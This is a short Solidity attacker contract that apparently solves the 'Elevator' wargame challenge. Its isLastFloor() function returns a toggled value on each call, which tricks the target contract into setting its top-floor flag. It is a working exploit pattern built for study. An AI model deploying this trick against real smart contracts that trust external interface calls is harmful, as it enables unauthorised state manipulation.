// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

/// @title Elevator challenge attacker contract 
/// @notice This contract is attacking Elevator contract, calling its function goTo() (msg.sender)
/// and developing the function defined in the interface Building,
/// in a way that an Elevator contract state variable become true. 

contract ElevatorAttack {

    Elevator elevatorContract;
    bool toggle;

    constructor(address _address) public{
        elevatorContract = Elevator(_address);
        toggle = true;
    }

    function isLastFloor(uint256 _num) external returns (bool){
        toggle = !toggle;
        return toggle;
    }

    function go(uint256 _floor) public{
        elevatorContract.goTo(_floor);
    }



}